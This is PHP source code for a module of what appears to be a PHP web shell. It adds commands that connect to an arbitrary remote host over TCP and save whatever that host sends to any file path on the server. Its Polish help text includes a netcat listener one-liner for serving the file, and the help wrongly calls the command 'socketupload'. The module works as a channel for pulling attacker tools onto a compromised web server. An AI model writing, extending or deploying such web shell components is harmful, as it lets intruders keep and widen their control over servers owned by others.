<?php

/**
 * ModuleSocketDownload - Pobieranie pliku za pomoca socket'a
 */
class ModuleSocketDownload implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'socketdownload',
			'socketdown',
			'socketget'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.0 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Pobieranie pliku za pomocą protokołu TCP

	Użycie:
		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany

	Przykład:
		socketupload localhost:6666 /tmp/plik.txt

	NetCat:
		nc -vv -w 1 -l -p 6666 < plik.txt
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 2 )
		{
			return $this -> getHelp();
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		$aHost = $this -> getHost( $this -> oShell -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> oShell -> aArgv[0] );
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> oShell -> aArgv[0] ) );
		}

		/**
		 * File
		 */
		if( ! ( $rFile = fopen( $this -> oShell -> aArgv[1], 'w' ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> oShell -> aArgv[1] ) );
		}

		while( ! feof( $rSock ) )
		{
			fwrite( $rFile, fread( $rSock, 131072 ) );
		}

		fclose( $rFile );
		fclose( $rSock );

		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> oShell -> aArgv[1] ) );
	}

}